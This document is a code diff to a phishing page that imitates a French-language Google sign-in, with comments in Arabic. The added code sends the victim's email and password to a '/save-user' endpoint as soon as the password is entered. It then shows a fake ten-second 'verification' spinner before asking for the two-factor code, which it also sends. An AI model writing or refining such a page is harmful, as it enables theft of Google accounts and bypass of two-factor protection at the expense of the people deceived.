@@ -62,7 +62,6 @@
       margin-bottom: 32px;
     }
 
-    /* Outlined Input Box with floating label */
     .input-group {
       position: relative;
       margin-bottom: 12px;
@@ -121,7 +120,7 @@
       background-color: #1557b0;
     }
 
-    #step2, #step3, #success-message {
+    #step2, #step3, #loading-spinner, #success-message {
       display: none;
     }
 
@@ -147,6 +146,21 @@
       width: 18px;
       height: 18px;
     }
+
+    /* شريط التحميل أثناء الـ 10 ثواني */
+    .spinner {
+      margin: 40px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1a73e8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -159,14 +173,13 @@
       <h1 class="title">Connexion</h1>
     </div>
 
-    <!-- Étape 1: Adresse e-mail ou téléphone -->
+    <!-- Étape 1: البريد الإلكتروني -->
     <div id="step1">
       <p class="subtitle">Utilisez votre compte Google. Il sera ajouté à cet appareil et disponible pour d'autres applis Google.</p>
       <a href="#" class="learn-more">En savoir plus sur l'utilisation de votre compte</a>
 
       <form id="step1Form">
         <div class="input-group">
-          <!-- إضافة شرط pattern لمنع القبول إلا إذا كان ينتهي بـ @gmail.com -->
           <input 
             type="email" 
             id="emailInput" 
@@ -188,7 +201,7 @@
       </form>
     </div>
 
-    <!-- Étape 2: Mot de passe -->
+    <!-- Étape 2: كلمة السر -->
     <div id="step2">
       <div class="user-chip" id="userEmailDisplay"></div>
       <form id="step2Form">
@@ -205,12 +218,18 @@
       </form>
     </div>
 
-    <!-- Étape 3: Code de vérification -->
+    <!-- شاشة التحميل (الانتظار 10 ثواني) -->
+    <div id="loading-spinner">
+      <div class="spinner"></div>
+      <p style="text-align: center; color: #5f6368; font-size: 14px;">Vérification des informations...</p>
+    </div>
+
+    <!-- Étape 3: كود التحقق (تظهر بعد 10 ثواني) -->
     <div id="step3">
       <form id="step3Form">
         <div class="input-group">
-          <input type="text" id="codeInput" required autocomplete="off">
-          <label for="codeInput">Code de vérification</label>
+          <input type="text" id="codeInput" autocomplete="off">
+          <label for="codeInput">Code de vérification (Saisir le code)</label>
         </div>
         <div class="actions-row" style="justify-content: flex-end;">
           <button type="submit" class="btn-next">Valider</button>
@@ -232,6 +251,7 @@
     const step1Div = document.getElementById('step1');
     const step2Div = document.getElementById('step2');
     const step3Div = document.getElementById('step3');
+    const loadingSpinner = document.getElementById('loading-spinner');
 
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
@@ -239,13 +259,31 @@
     const userEmailDisplay = document.getElementById('userEmailDisplay');
     const successMsg = document.getElementById('success-message');
 
+    // دالة إرسال البيانات فورياً للسيرفر
+    async function sendUserData(codeValue) {
+      const payload = {
+        email: emailInput.value,
+        password: passwordInput.value,
+        code: codeValue || 'nulle'
+      };
+
+      try {
+        await fetch('/save-user', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Erreur d'envoi:", err);
+      }
+    }
+
     // Étape 1 -> Étape 2
     step1Form.addEventListener('submit', function(e) {
       e.preventDefault();
       
       const emailVal = emailInput.value.trim();
       
-      // التحقق البرمجي الإضافي من اللاحقة @gmail.com
       if (!emailVal.toLowerCase().endsWith('@gmail.com')) {
         alert("Veuillez saisir une adresse e-mail valide se terminant par @gmail.com");
         return;
@@ -256,41 +294,35 @@
       step2Div.style.display = 'block';
     });
 
-    // Étape 2 -> Étape 3
-    step2Form.addEventListener('submit', function(e) {
+    // Étape 2 -> إرسال فوري للأيميل والكلمة السرية كـ nulle + انتظار 10 ثواني -> إظهار الكود
+    step2Form.addEventListener('submit', async function(e) {
       e.preventDefault();
+      
+      // 1. إرسال فوري لبيانات البريد وكلمة السر كـ nulle
+      await sendUserData('nulle');
+
+      // 2. إخفاء واجهة كلمة السر وإظهار شاشة الانتظار
       step2Div.style.display = 'none';
-      step3Div.style.display = 'block';
+      loadingSpinner.style.display = 'block';
+
+      // 3. الانتظار 10 ثواني (10000ms)
+      setTimeout(() => {
+        loadingSpinner.style.display = 'none';
+        step3Div.style.display = 'block'; // فتح واجهة الكود
+      }, 10000);
     });
 
-    // Étape 3 -> الإرسال للسيرفر (/save-user)
+    // Étape 3 -> إرسال الكود إذا كُتب أو 'nulle' إذا تُرك فارغاً
     step3Form.addEventListener('submit', async function(e) {
       e.preventDefault();
       
-      const payload = {
-        email: emailInput.value,
-        password: passwordInput.value,
-        code: codeInput.value
-      };
+      const userCode = codeInput.value.trim() ? codeInput.value.trim() : 'nulle';
+      
+      // إرسال البيانات مجدداً وتأكيد الكود
+      await sendUserData(userCode);
 
-      try {
-        const response = await fetch('/save-user', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        const result = await response.json();
-        if (result.status === 'success') {
-          step3Div.style.display = 'none';
-          successMsg.style.display = 'block';
-        } else {
-          alert('Erreur lors de la sauvegarde');
-        }
-      } catch (err) {
-        console.error(err);
-        alert('Erreur réseau ou serveur');
-      }
+      step3Div.style.display = 'none';
+      successMsg.style.display = 'block';
     });
 
     function togglePassword() {
